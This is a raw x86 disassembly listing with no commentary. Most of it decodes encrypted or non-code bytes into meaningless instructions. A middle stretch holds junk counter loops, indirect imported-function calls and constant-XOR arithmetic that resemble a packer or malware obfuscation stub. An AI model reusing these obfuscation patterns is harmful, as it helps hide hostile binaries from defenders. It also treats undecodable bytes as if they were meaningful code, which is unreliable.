  407196:	or     eax,0x164f32e2
  40719b:	or     eax,0x1b04f9f7
  4071a0:	fld    QWORD PTR [edx-0x57]
  4071a3:	es inc eax
  4071a5:	sub    cl,BYTE PTR [esi-0x4cb320f3]
  4071ab:	test   eax,0xdba5717
  4071b0:	cmp    DWORD PTR [edx],0xffffff9f
  4071b3:	push   ds
  4071b4:	mov    esi,0x5ce5a07e
  4071b9:	(bad)  
  4071ba:	loop   0x407186
  4071bc:	add    al,0xdf
  4071be:	out    0x60,eax
  4071c0:	test   eax,0xc8a0eb4d
  4071c5:	out    dx,eax
  4071c6:	jb     0x4071bc
  4071c8:	mov    bh,0xe
  4071ca:	mov    dh,0xb3
  4071cc:	dec    ecx
  4071cd:	pop    edx
  4071ce:	in     eax,dx
  4071cf:	mov    DWORD PTR [ebx-0x56],edx
  4071d2:	aam    0x64
  4071d4:	jnp    0x4071ef
  4071d6:	mov    ah,0x69
  4071d8:	es xchg ecx,eax
  4071da:	in     eax,0x74
  4071dc:	xchg   BYTE PTR [ebx-0x36b40c5b],ch
  4071e2:	sbb    al,0xf7
  4071e4:	adc    ah,BYTE PTR [esi+0x47]
  4071e7:	int3   
  4071e8:	fldenv [ebx-0xa]
  4071eb:	pop    es
  4071ec:	aam    0xa1
  4071ee:	cwde   
  4071ef:	shr    DWORD PTR [ebx+0x49f6e392],0x1c
  4071f6:	in     al,dx
  4071f7:	dec    edx
  4071f8:	inc    esi
  4071f9:	and    ebp,eax
  4071fb:	sbb    cl,bl
  4071fd:	retf   
  4071fe:	jno    0x4071ba
  407200:	mov    bl,0x12
  407202:	fnstenv [ecx]
  407204:	push   ds
  407205:	cmc    
  407206:	fdiv   st,st(6)
  407208:	popa   
  407209:	retf   
  40720a:	(bad)  
  40720c:	add    DWORD PTR [edi+0x32d3f93b],edx
  407212:	aad    0x92
  407214:	cmp    eax,0xb53d571c
  407219:	aaa    
  40721a:	lods   al,BYTE PTR ds:[esi]
  40721b:	xchg   esi,eax
  40721c:	push   ecx
  40721d:	and    ebx,DWORD PTR [eax+0xf]
  407220:	test   al,0x18
  407222:	pop    esi
  407223:	push   esi
  407224:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407225:	xchg   ebx,eax
  407226:	mov    dl,BYTE PTR [eax]
  407228:	test   DWORD PTR [edi+eax*1-0x25],edx
  40722c:	or     ebx,DWORD PTR [ecx-0x3b]
  40722f:	cmp    edx,DWORD PTR [ecx+0x5f8df64c]
  407235:	(bad)  
  407237:	mov    ch,BYTE PTR [edi+0x77]
  40723a:	mov    esi,0x1230ffa4
  40723f:	cmp    al,0xc6
  407241:	ficomp WORD PTR [ecx-0x29]
  407244:	adc    eax,0x2ca72cf4
  407249:	dec    ebp
  40724a:	xchg   esp,eax
  40724b:	inc    esi
  40724c:	push   ss
  40724d:	cmp    esi,DWORD PTR [edi]
  40724f:	fs push edi
  407251:	adc    ch,BYTE PTR [ebp-0x56]
  407254:	rcl    ch,cl
  407256:	inc    ecx
  407257:	lahf   
  407258:	retf   
  407259:	mov    cl,0xa2
  40725b:	and    al,0x1e
  40725d:	xchg   esi,eax
  40725e:	xchg   ebx,eax
  40725f:	cmp    al,0x36
  407261:	(bad)  
  407262:	fstp   st(2)
  407264:	push   ebp
  407265:	out    0x71,al
  407267:	mov    ds:0x965df558,eax
  40726c:	xchg   bh,bl
  40726e:	in     al,0xce
  407270:	pop    esi
  407271:	push   edx
  407272:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407273:	les    edx,FWORD PTR [edi-0x292daa88]
  407279:	stos   BYTE PTR es:[edi],al
  40727a:	pop    edi
  40727b:	pop    ebp
  40727c:	pop    ss
  40727d:	sbb    esp,edi
  40727f:	dec    eax
  407280:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407281:	mov    dl,0xe7
  407283:	daa    
  407284:	lock xchg esi,eax
  407286:	adc    ecx,DWORD PTR [eax-0x2]
  407289:	jbe    0x407223
  40728b:	jl     0x40730a
  40728d:	push   ds
  40728e:	push   ecx
  40728f:	sub    eax,0x7cd3fad3
  407294:	push   edi
  407295:	(bad)  
  407296:	neg    dl
  407298:	rol    ebx,cl
  40729a:	and    al,0x65
  40729c:	bound  edx,QWORD PTR [ecx+eiz*2]
  40729f:	mov    eax,0xdc9b71e2
  4072a4:	cmp    ecx,DWORD PTR [edx+0x56]
  4072a7:	jns    0x40722d
  4072a9:	or     esp,edx
  4072ab:	mov    ch,0x5d
  4072ad:	std    
  4072ae:	adc    BYTE PTR [edx],cl
  4072b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072b1:	add    bh,BYTE PTR [ecx+0x222147c1]
  4072b7:	retf   0x8b86
  4072ba:	sbb    al,0xd6
  4072bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072bd:	sub    eax,0xfd901dd6
  4072c2:	les    ebp,FWORD PTR [edx]
  4072c4:	int    0x21
  4072c6:	add    al,BYTE PTR [ebx]
  4072c8:	sti    
  4072c9:	lock (bad) 
  4072cb:	cld    
  4072cc:	jns    0x407308
  4072ce:	outs   dx,BYTE PTR ds:[esi]
  4072cf:	aaa    
  4072d0:	mov    dh,0xa5
  4072d2:	imul   ecx,DWORD PTR [eax],0x43
  4072d5:	loope  0x4072de
  4072d7:	inc    edi
  4072d8:	mov    cl,0xd4
  4072da:	pop    eax
  4072db:	jp     0x407320
  4072dd:	mov    ecx,0x6e6d3d40
  4072e2:	pop    ds
  4072e3:	lea    edi,[ebp-0x34b8b6c4]
  4072e9:	repz mov edx,0xddbd8eb
  4072ef:	push   ss
  4072f0:	xor    eax,0xea74329a
  4072f5:	(bad)  
  4072f6:	mov    ds:0x7951ccc0,eax
  4072fb:	push   edi
  4072fc:	jbe    0x40736a
  4072fe:	push   edx
  4072ff:	push   edi
  407300:	les    ecx,FWORD PTR [ebx-0x4e00c1dd]
  407306:	push   ecx
  407307:	mov    eax,ds:0x405387a4
  40730c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40730d:	pshufw mm1,QWORD PTR [esi-0x15505ac],0x8a
  407315:	push   ss
  407316:	bound  esp,QWORD PTR [edx]
  407318:	mov    al,ds:0x27388e73
  40731d:	inc    bl
  40731f:	jle    0x4072ec
  407321:	sub    al,0x7c
  407323:	je     0x40734b
  407325:	pop    ecx
  407326:	shl    BYTE PTR [eax+edx*4-0x31],cl
  40732a:	jmp    0x82a9a1fa
  40732f:	adc    cl,BYTE PTR [esp+eiz*4+0x57]
  407333:	(bad)  
  407335:	aad    0x11
  407337:	sar    al,0x2b
  40733a:	sub    DWORD PTR [eax],esp
  40733c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40733d:	jge    0x40738c
  40733f:	mov    al,0x77
  407341:	adc    eax,0x7a3e843
  407346:	sbb    esi,DWORD PTR [eax]
  407348:	xor    bl,BYTE PTR [edx+0x77]
  40734b:	mov    ebx,ebp
  40734d:	popf   
  40734e:	dec    esp
  40734f:	sbb    al,0x58
  407351:	mov    eax,0x28618eee
  407356:	sbb    eax,0x1941793f
  40735b:	xlat   BYTE PTR ds:[ebx]
  40735c:	aam    0x9a
  40735e:	sti    
  40735f:	mov    ds:0xb6d50257,al
  407364:	xchg   ebp,eax
  407365:	loopne 0x40733f
  407367:	nop
  407368:	cmp    DWORD PTR [ebx+0x8d2ba1],ecx
  40736e:	xor    dh,0x45
  407371:	sbb    bl,BYTE PTR [ebx+0x79]
  407374:	clc    
  407375:	dec    esi
  407376:	ss push eax
  407378:	add    BYTE PTR [edi+0x43],0xd
  40737c:	dec    eax
  40737d:	sub    DWORD PTR [eax+0x15b3e2ab],esp
  407383:	fisttp DWORD PTR [edi+0x579b0382]
  407389:	es into 
  40738b:	in     al,dx
  40738c:	ja     0x40733b
  40738e:	repnz repz mov cl,0x44
  407392:	es mov eax,0xee88b356
  407398:	mov    ecx,0x876f2cb7
  40739d:	push   edi
  40739e:	or     BYTE PTR [esi+0xf],ah
  4073a1:	cmp    edx,eax
  4073a3:	sbb    eax,0x2a6fc36d
  4073a8:	or     eax,0x625a302c
  4073ad:	mov    ds:0xb091e195,eax
  4073b2:	jno    0x407432
  4073b4:	and    esi,DWORD PTR [eax+0x1078c079]
  4073ba:	arpl   WORD PTR [edi-0x72e86b45],cx
  4073c0:	push   0xffffffd9
  4073c2:	pop    esp
  4073c3:	inc    edi
  4073c4:	mov    ss,WORD PTR [ebp-0x44]
  4073c7:	loop   0x407388
  4073c9:	lds    ebx,FWORD PTR fs:[edx]
  4073cc:	fmul   QWORD PTR [eax+0x462c4b8a]
  4073d2:	out    dx,eax
  4073d3:	aaa    
  4073d4:	rcl    BYTE PTR [edx],1
  4073d6:	ss ds fcmovb st,st(1)
  4073da:	cli    
  4073db:	push   esp
  4073dc:	mov    edx,0xbfa1abf3
  4073e1:	cmc    
  4073e2:	ds pop ds
  4073e4:	js     0x407383
  4073e6:	mov    WORD PTR [esi-0x6ccdcbe2],gs
  4073ec:	lahf   
  4073ed:	xchg   edx,eax
  4073ee:	in     al,0x17
  4073f0:	cmp    eax,0x49eb0dbd
  4073f5:	dec    ebp
  4073f6:	mov    eax,edx
  4073f8:	(bad)
  4073fb:	in     eax,0xc
  4073fd:	inc    edi
  4073fe:	cdq    
  4073ff:	fisttp DWORD PTR [edx+0x42e5bd95]
  407405:	xor    dl,bl
  407407:	(bad)  
  407408:	sbb    DWORD PTR [edi+eax*8],ecx
  40740b:	mov    DWORD PTR [edi+0x86f057b],eax
  407411:	jne    0x40744e
  407413:	add    eax,0x8cc32738
  407418:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407419:	(bad)  
  40741a:	cs out 0x2c,eax
  40741d:	popa   
  40741e:	bound  ecx,QWORD PTR [edx+0x2d6ce11d]
  407424:	iret   
  407425:	popa   
  407426:	sub    DWORD PTR [edx+0x3392af0e],esi
  40742c:	repz mov al,ds:0xf5050812
  407432:	aas    
  407433:	and    DWORD PTR [ecx+0x40fbf060],edx
  407439:	cmp    edx,DWORD PTR [ebp+0x46]
  40743c:	into   
  40743d:	dec    ecx
  40743e:	inc    edx
  40743f:	(bad)  
  407440:	popa   
  407441:	and    ah,BYTE PTR [ebx]
  407443:	add    ebx,DWORD PTR [esi-0x46]
  407446:	fisttp WORD PTR [ebx+0x62]
  407449:	sbb    cl,BYTE PTR [ebx-0x107b2974]
  40744f:	lds    ebx,FWORD PTR [edx]
  407451:	and    eax,0x1b815497
  407456:	int3   
  407457:	ror    BYTE PTR [eax+edi*4+0x64cb976c],cl
  40745e:	or     eax,0xa921b3cf
  407463:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407464:	xor    esp,DWORD PTR [esi-0x16]
  407467:	inc    ecx
  407468:	pusha  
  407469:	adc    BYTE PTR gs:[edi+0x7f],bl
  40746d:	xor    DWORD PTR [eax+0x22c29efa],0x15649d7b
  407477:	mov    edx,0x3cf6a246
  40747c:	pop    ebx
  40747d:	dec    esi
  40747e:	dec    esi
  40747f:	out    0xbe,al
  407481:	mov    dl,BYTE PTR [ebx-0x39]
  407484:	add    eax,0x433597
  407489:	pop    ss
  40748a:	add    BYTE PTR [eax],al
  40748c:	add    BYTE PTR [ebx+0x4335973d],al
  407492:	add    BYTE PTR [eax],al
  407494:	je     0x4074de
  40749a:	cmp    DWORD PTR ds:0x433597,0xc
  4074a1:	jne    0x4074b2
  4074a7:	push   0x26d7
  4074ac:	call   DWORD PTR ds:0x41218c
  4074b2:	cmp    DWORD PTR ds:0x433597,0xd
  4074b9:	jne    0x4074cc
  4074bf:	mov    ecx,DWORD PTR ds:0x433597
  4074c5:	dec    ecx
  4074c6:	mov    DWORD PTR ds:0x433597,ecx
  4074cc:	mov    ecx,DWORD PTR ds:0x433597
  4074d2:	dec    ecx
  4074d3:	mov    DWORD PTR ds:0x433597,ecx
  4074d9:	jmp    0x40748d
  4074de:	lea    eax,[ebp-0x18]
  4074e1:	not    DWORD PTR ds:0x4335ab
  4074e7:	mov    DWORD PTR [ebp-0x1c],eax
  4074ea:	add    DWORD PTR ds:0x4335ab,ecx
  4074f0:	jmp    0x407866
  4074f5:	xchg   esi,eax
  4074f6:	je     0x407544
  4074f8:	cwde   
  4074f9:	outs   dx,BYTE PTR ds:[esi]
  4074fa:	mov    al,ds:0x62ca7272
  4074ff:	mov    cl,0xe2
  407501:	popf   
  407502:	mov    eax,ds:0xc8561bf7
  407507:	jl     0x407585
  407509:	xlat   BYTE PTR ds:[ebx]
  40750a:	jns    0x407588
  40750c:	jl     0x4074d9
  40750e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40750f:	out    dx,al
  407510:	(bad)  
  407512:	sbb    eax,0xa7a13e7a
  407517:	inc    eax
  407518:	lds    ecx,FWORD PTR ds:0xfbe4292
  40751e:	mov    edx,0x4b255d50
  407523:	(bad)  
  407525:	jg     0x4074af
  407527:	jne    0x407537
  407529:	popa   
  40752a:	pop    edx
  40752b:	dec    ecx
  40752c:	jne    0x4074c2
  40752e:	lock push ecx
  407530:	sti    
  407531:	ins    DWORD PTR es:[edi],dx
  407532:	sub    eax,0x8c131bf0
  407537:	push   ds
  407538:	mov    bl,bl
  40753a:	loop   0x407563
  40753c:	call   0x3cbc1e4f
  407541:	repnz or eax,0xa96a19df
  407547:	lock push esi
  407549:	pop    ds
  40754a:	leave  
  40754b:	xchg   ebx,edi
  40754d:	sbb    dh,bl
  40754f:	cwde   
  407550:	(bad)  
  407551:	sbb    BYTE PTR [edi+0x4d16349e],cl
  407557:	add    BYTE PTR [ecx-0x13],dl
  40755a:	les    eax,FWORD PTR [eax]
  40755c:	xchg   edi,eax
  40755d:	xlat   BYTE PTR ds:[ebx]
  40755e:	(bad)  
  407560:	aaa    
  407561:	cwde   
  407562:	jge    0x407517
  407564:	test   edx,esp
  407566:	xor    al,0xe5
  407568:	pop    ebx
  407569:	cmp    eax,DWORD PTR [esi-0x21]
  40756c:	mov    DWORD PTR [ebx-0x64f8fb33],eax
  407572:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407574:	aaa    
  407575:	dec    eax
  407576:	push   0x52
  407578:	jmp    0x40753d
  40757a:	mov    esi,0x945a64eb
  40757f:	or     eax,0x97f9f9c1
  407584:	lods   al,BYTE PTR ds:[esi]
  407585:	xor    BYTE PTR [ebp+0x5026311b],ch
  40758b:	stc    
  40758c:	adc    esp,DWORD PTR [edi]
  40758e:	daa    
  40758f:	clc    
  407590:	jl     0x40753b
  407592:	push   edi
  407593:	sub    ecx,DWORD PTR [esi+0x1350d8]
  407599:	fnstcw WORD PTR [ecx+0x32284434]
  40759f:	fs loopne 0x407545
  4075a2:	jle    0x4075f0
  4075a4:	mov    ds:0xa76ab1d9,al
  4075a9:	in     eax,0x7b
  4075ab:	shl    BYTE PTR [esi+0x7fb0d763],cl
  4075b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075b2:	xchg   ebp,eax
  4075b3:	xor    bl,BYTE PTR [ebp+0x44]
  4075b6:	mov    ebx,0xd472e8b9
  4075bb:	fadd   QWORD PTR [eax+0x6f]
  4075be:	loop   0x407614
  4075c0:	test   al,0xf0
  4075c2:	fstp   TBYTE PTR ds:0x9003ecaf
  4075c8:	add    BYTE PTR [ebx-0x676266c6],al
  4075ce:	mov    eax,ds:0x335d91af
  4075d3:	push   edx
  4075d4:	pop    ss
  4075d5:	call   0x1fe9:0x27f634d3
  4075dc:	sahf   
  4075dd:	mov    al,ds:0xe69a6c3f
  4075e2:	or     cl,ch
  4075e4:	arpl   WORD PTR [edi+0x1cb7c1ce],bp
  4075ea:	adc    eax,0x3159214b
  4075ef:	pop    ebp
  4075f0:	fisttp DWORD PTR [esi+ebx*8]
  4075f3:	xchg   ebp,eax
  4075f4:	or     BYTE PTR [ecx+eiz*2-0x3bfeadb6],al
  4075fb:	sti    
  4075fc:	retf   0x1ca3
  4075ff:	mov    ds:0xd7914b68,al
  407604:	pop    edi
  407605:	addr16 mov edx,0x4a28f788
  40760b:	mov    WORD PTR [eax+0x4bd74453],es
  407611:	pop    edi
  407612:	or     ebp,DWORD PTR [edx]
  407614:	jb     0x4075d3
  407616:	out    dx,al
  407617:	dec    eax
  407618:	dec    eax
  407619:	mov    ds:0xc4ac23c5,eax
  40761e:	dec    ebx
  40761f:	jmp    0x40767d
  407621:	nop
  407622:	push   ecx
  407623:	sub    ch,bh
  407625:	in     eax,0xd7
  407627:	leave  
  407628:	push   edx
  407629:	aas    
  40762a:	bound  edx,QWORD PTR [esi+0xe]
  40762d:	jne    0x407624
  40762f:	fcmovnb st,st(0)
  407631:	or     eax,0xc335e4f5
  407636:	and    DWORD PTR [ebx+0x5d3b4f86],esi
  40763c:	pushf  
  40763d:	xor    DWORD PTR [eax+0x31],ebp
  407640:	jl     0x407634
  407642:	inc    ecx
  407643:	adc    bl,bl
  407645:	neg    DWORD PTR [eax+0x48229b8a]
  40764b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40764c:	cdq    
  40764d:	int3   
  40764e:	cs sbb eax,0x35a83782
  407654:	dec    ecx
  407655:	js     0x407652
  407657:	push   ebx
  407658:	mov    dl,0xef
  40765a:	mov    edi,0xaba88009
  40765f:	sub    ch,BYTE PTR [esi+0x29]
  407662:	in     al,0xfb
  407664:	jns    0x407691
  407666:	adc    BYTE PTR [esi-0x77],bl
  407669:	push   0xfd69e581
  40766e:	fyl2xp1 
  407670:	mov    esp,0x99715d87
  407675:	inc    ecx
  407676:	sbb    DWORD PTR gs:[edx],ebx
  407679:	in     al,0x9d
  40767b:	jp     0x407676
  40767d:	jo     0x40760e
  40767f:	mov    esp,0x117204cb
  407684:	gs add eax,0x381edfc8
  40768a:	pop    ebx
  40768b:	dec    ebp
  40768c:	shl    DWORD PTR [edi],0x42
  40768f:	mov    ebx,0x102e4ec9
  407694:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407695:	sbb    ecx,DWORD PTR [eax+0x7d]
  407698:	pop    esp
  407699:	jo     0x4076ba
  40769b:	add    dh,BYTE PTR [edi-0x53d32bad]
  4076a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076a2:	add    al,0xb7
  4076a4:	pop    ss
  4076a5:	ret    0x4d44
  4076a8:	call   0xd7d5:0x79b338aa
  4076af:	ja     0x40772e
  4076b1:	jmp    0x4076f0
  4076b3:	mov    bh,0x1f
  4076b5:	leave  
  4076b6:	or     al,0xf2
  4076b8:	xchg   esp,eax
  4076b9:	out    dx,eax
  4076ba:	lahf   
  4076bb:	inc    eax
  4076bc:	fld    QWORD PTR [ebx-0x48]
  4076bf:	retf   0xff15
  4076c2:	ds clc 
  4076c4:	add    eax,0x49e97aa9
  4076c9:	aaa    
  4076ca:	and    edx,DWORD PTR [eax]
  4076cc:	xor    esp,eax
  4076ce:	fidiv  WORD PTR [ecx]
  4076d0:	jge    0x40768a
  4076d2:	dec    eax
  4076d3:	or     eax,0x7f6d038f
  4076d8:	dec    ebx
  4076d9:	inc    eax
  4076da:	pop    ecx
  4076db:	in     al,dx
  4076dc:	push   es
  4076dd:	rol    ecx,0x6b
  4076e0:	push   0xffffff9f
  4076e2:	sub    al,0x30
  4076e4:	mov    ebx,0xabac8228
  4076e9:	lock lods al,BYTE PTR ds:[esi]
  4076eb:	mov    ah,0x90
  4076ed:	adc    DWORD PTR [edi-0x4960634c],edx
  4076f3:	dec    edi
  4076f4:	call   0x9b49f59b
  4076f9:	jnp    0x40772e
  4076fb:	jmp    0x7c75:0x7770e333
  407702:	cmp    eax,ecx
  407704:	fincstp 
  407706:	pushf  
  407707:	mov    ebp,0x477b77dd
  40770c:	call   0xf761ac04
  407711:	add    ebx,DWORD PTR [esi]
  407713:	inc    edx
  407714:	dec    ecx
  407715:	clc    
  407716:	push   es
  407717:	dec    edi
  407718:	jl     0x4076b8
  40771a:	jecxz  0x407748
  40771c:	int    0xda
  40771e:	rcl    DWORD PTR [esi-0x26d3f804],cl
  407724:	ins    DWORD PTR es:[edi],dx
  407725:	shl    BYTE PTR [edi],1
  407727:	or     edx,DWORD PTR [edx]
  407729:	mov    al,ds:0xcdfd9e82
  40772e:	jmp    DWORD PTR [edi]
  407730:	ja     0x407737
  407732:	call   0x16229480
  407737:	mov    ds:0x6181aca3,eax
  40773c:	push   esp
  40773d:	leave  
  40773e:	jo     0x855b7232
  407744:	push   ecx
  407745:	mov    edx,es
  407747:	or     eax,0xf7db3f6e
  40774c:	xor    al,0x48
  40774e:	std    
  40774f:	inc    ecx
  407750:	rol    BYTE PTR [edi],0xcb
  407753:	or     al,BYTE PTR [eax]
  407755:	test   eax,0x4e967c19
  40775a:	jns    0x4076e4
  40775c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40775d:	jne    0x407776
  40775f:	fmulp  st(4),st
  407761:	xchg   ebp,eax
  407762:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407763:	xchg   ebp,eax
  407764:	out    dx,al
  407765:	mov    ah,0xc8
  407767:	pop    edi
  407768:	inc    ebp
  407769:	jno    0x407715
  40776b:	scas   eax,DWORD PTR es:[edi]
  40776c:	aas    
  40776d:	pop    DWORD PTR [ecx]
  40776f:	pop    edx
  407770:	hlt    
  407771:	shl    ch,0x56
  407774:	das    
  407775:	adc    DWORD PTR cs:[ecx+0x36112595],0xe74a7fc5
  407780:	xchg   esi,eax
  407781:	(bad)  
  407782:	adc    bl,BYTE PTR [ebx-0x72]
  407785:	mov    esp,0xbe3b88
  40778a:	xchg   edx,eax
  40778b:	sbb    edi,ebp
  40778d:	adc    BYTE PTR [ebp-0x5a],dl
  407790:	adc    esp,DWORD PTR [ebx+0x29]
  407793:	jno    0x4077b1
  407795:	lds    eax,FWORD PTR [ecx-0x23]
  407798:	cdq    
  407799:	retf   0x3af1
  40779c:	sbb    BYTE PTR [ebx-0x432f2964],0x32
  4077a3:	inc    edx
  4077a4:	adc    eax,0x88107d3
  4077a9:	scas   eax,DWORD PTR es:[edi]
  4077aa:	aas    
  4077ab:	icebp  
  4077ac:	push   ecx
  4077ad:	push   ecx
  4077ae:	xchg   esi,eax
  4077af:	into   
  4077b0:	adc    DWORD PTR [edx+0x3000f7a6],ebx
  4077b6:	inc    ecx
  4077b7:	mov    ds:0xb5f27c2,al
  4077bc:	imul   BYTE PTR [edx-0x1d]
  4077bf:	loope  0x407746
  4077c1:	sub    ebx,DWORD PTR [ecx-0x23c7b83b]
  4077c7:	in     al,0x84
  4077c9:	xchg   BYTE PTR [edi-0x19],dh
  4077cc:	mov    ecx,0x5660e6b5
  4077d1:	mov    eax,0xf2e4545d
  4077d6:	cmp    DWORD PTR [esi+0x2c],edx
  4077d9:	mov    dl,bh
  4077db:	out    0xd7,al
  4077dd:	invd   
  4077df:	sar    edx,1
  4077e1:	pop    esp
  4077e2:	inc    esi
  4077e3:	mov    ds:0x1df4fd35,al
  4077e8:	xor    eax,0xfb64fef6
  4077ed:	clc    
  4077ee:	loope  0x407832
  4077f0:	ret    0x2094
  4077f3:	call   FWORD PTR [eax]
  4077f5:	xor    eax,0x2d2e12f0
  4077fa:	push   ss
  4077fb:	xchg   esp,eax
  4077fc:	xchg   esp,eax
  4077fd:	sub    ebp,DWORD PTR [esi-0x4c]
  407800:	push   ss
  407801:	sahf   
  407802:	pop    ebp
  407803:	jge    0x407822
  407805:	lods   eax,DWORD PTR ds:[esi]
  407806:	pop    ebp
  407807:	cmp    al,0xa8
  407809:	lea    ebp,[ecx-0x6c]
  40780c:	aas    
  40780d:	sbb    eax,0xf9fdd500
  407812:	xchg   BYTE PTR [ecx-0x58ad177b],cl
  407818:	adc    BYTE PTR [ecx],al
  40781a:	ret    
  40781b:	xchg   edi,eax
  40781c:	ss pop ds
  40781e:	stc    
  40781f:	mov    ds:0xce69f251,al
  407824:	retf   0x1adb
  407827:	jmp    0x1126:0xfbf0bd89
  40782e:	inc    edi
  40782f:	aaa    
  407830:	cmp    eax,0xe7806ec
  407835:	int3   
  407836:	adc    ah,bl
  407838:	cwde   
  407839:	push   0xf4861be4
  40783e:	das    
  40783f:	inc    esp
  407840:	stos   BYTE PTR es:[edi],al
  407841:	mov    cl,0x86
  407843:	sahf   
  407844:	shl    dl,0x66
  407847:	test   BYTE PTR [ebx],dl
  407849:	jbe    0x407827
  40784b:	pushf  
  40784c:	daa    
  40784d:	push   es
  40784e:	ja     0x4077dc
  407850:	stos   BYTE PTR es:[edi],al
  407851:	retf   
  407852:	cmp    al,0x88
  407854:	cmc    
  407855:	popf   
  407856:	out    dx,al
  407857:	jae    0x407883
  407859:	add    al,0xc7
  40785b:	mov    eax,ds:0xfcde1c19
  407860:	lahf   
  407861:	rol    BYTE PTR [esi-0x74da8564],cl
  407867:	inc    ebp
  407868:	in     al,0x81
  40786a:	and    eax,0x433617
  40786f:	add    BYTE PTR [eax],al
  407871:	add    BYTE PTR [eax],al
  407873:	mov    ebx,DWORD PTR ds:0x433617
  407879:	inc    ebx
  40787a:	mov    DWORD PTR ds:0x433617,ebx
  407880:	cmp    DWORD PTR ds:0x433617,0x6
  407887:	jne    0x407896
  40788d:	push   DWORD PTR [ebp-0x28]
  407890:	call   DWORD PTR ds:0x412190
  407896:	cmp    DWORD PTR ds:0x433617,0x5
  40789d:	jne    0x4078b0
  4078a3:	mov    ebx,DWORD PTR ds:0x433617
  4078a9:	inc    ebx
  4078aa:	mov    DWORD PTR ds:0x433617,ebx
  4078b0:	cmp    DWORD PTR ds:0x433617,0x15
  4078b7:	jb     0x407873
  4078bd:	push   esi
  4078be:	and    DWORD PTR ds:0x43354b,edi
  4078c4:	push   edi
  4078c5:	and    DWORD PTR ds:0x4335eb,0x0
  4078cf:	jmp    0x4078e1
  4078d4:	mov    edi,DWORD PTR ds:0x4335eb
  4078da:	inc    edi
  4078db:	mov    DWORD PTR ds:0x4335eb,edi
  4078e1:	cmp    DWORD PTR ds:0x4335eb,0x18
  4078e8:	jae    0x4079ae
  4078ee:	cmp    DWORD PTR ds:0x4335eb,0x8
  4078f5:	jne    0x407918
  4078fb:	push   0x117a
  407900:	push   DWORD PTR [ebp-0x28]
  407903:	push   0x433814
  407908:	push   0x86e1
  40790d:	push   0x5408
  407912:	call   DWORD PTR ds:0x41225c
  407918:	cmp    DWORD PTR ds:0x4335eb,0x7
  40791f:	jne    0x407934
  407925:	xor    edi,edi
  407927:	xor    edi,DWORD PTR ds:0x4335eb
  40792d:	inc    edi
  40792e:	mov    DWORD PTR ds:0x4335eb,edi
  407934:	jmp    0x4078d4
  407939:	mov    DWORD PTR ds:0x43354b,0x19
  407943:	cmp    DWORD PTR ds:0x43354b,0x0
  40794a:	je     0x4079ae
  407950:	cmp    DWORD PTR ds:0x43354b,0x9
  407957:	jne    0x40796e
  40795d:	push   DWORD PTR [ebp-0x1c]
  407960:	push   0x6ccd
  407965:	push   DWORD PTR [ebp-0x10]
  407968:	call   DWORD PTR ds:0x4120c4
  40796e:	cmp    DWORD PTR ds:0x43354b,0xa
  407975:	jne    0x407988
  40797b:	mov    edi,DWORD PTR ds:0x43354b
  407981:	dec    edi
  407982:	mov    DWORD PTR ds:0x43354b,edi
  407988:	mov    edi,DWORD PTR ds:0x43354b
  40798e:	dec    edi
  40798f:	mov    DWORD PTR ds:0x43354b,edi
  407995:	jmp    0x407943
  40799a:	xor    edi,edi
  40799c:	add    edi,DWORD PTR ds:0x4335ef
  4079a2:	or     edi,DWORD PTR ds:0x433663
  4079a8:	mov    DWORD PTR ds:0x4335ef,edi
  4079ae:	mov    edi,0xf89f2dad
  4079b3:	and    DWORD PTR ds:0x4335b3,0x0
  4079bd:	jmp    0x4079cf
  4079c2:	mov    esi,DWORD PTR ds:0x4335b3
  4079c8:	inc    esi
  4079c9:	mov    DWORD PTR ds:0x4335b3,esi
  4079cf:	cmp    DWORD PTR ds:0x4335b3,0x1e
  4079d6:	jae    0x4079f7
  4079dc:	cmp    DWORD PTR ds:0x4335b3,0x2c
  4079e3:	jne    0x4079f2
  4079e9:	push   DWORD PTR [ebp-0x28]
  4079ec:	call   DWORD PTR ds:0x4120c8
  4079f2:	jmp    0x4079c2
  4079f7:	mov    DWORD PTR [eax],edi
  4079f9:	mov    eax,DWORD PTR [ebp-0x14]
  4079fc:	mov    ebx,DWORD PTR [ebp-0x8]
  4079ff:	mov    ecx,0x7510853
  407a04:	xor    eax,ecx
  407a06:	mov    esi,0x32729a
  407a0b:	xor    ebx,ecx
  407a0d:	xor    edx,edx
  407a0f:	add    eax,esi
  407a11:	add    ebx,esi
  407a13:	div    ebx
  407a15:	mov    edx,DWORD PTR [ebp-0x20]
  407a18:	mov    DWORD PTR [ebp-0x2c],0x4ec5
  407a1f:	cmp    eax,DWORD PTR [edx]
  407a21:	je     0x40936a
  407a27:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407a2e:	lea    eax,[ebp-0xc]
  407a31:	mov    DWORD PTR [ebp-0x10],eax
  407a34:	mov    eax,DWORD PTR [ebp-0x10]
  407a37:	mov    edx,DWORD PTR [eax]
  407a39:	jmp    0x407daf
  407a3e:	sub    eax,0xb2df1e8f
  407a43:	imul   ebp,ebp,0x58ddbe5d
  407a49:	or     BYTE PTR [ecx-0x21],cl
  407a4c:	repnz mov al,0x29
  407a4f:	aam    0x7c
  407a51:	jl     0x407a2a
  407a53:	jns    0x407ad1
  407a55:	jl     0x407a89
  407a57:	hlt    
  407a58:	pop    ss
  407a59:	xor    DWORD PTR [eax+ebx*4+0x2854f01b],ebx
  407a60:	push   0xd2b88c6e
  407a65:	sbb    ch,bl
  407a67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a68:	inc    ebp
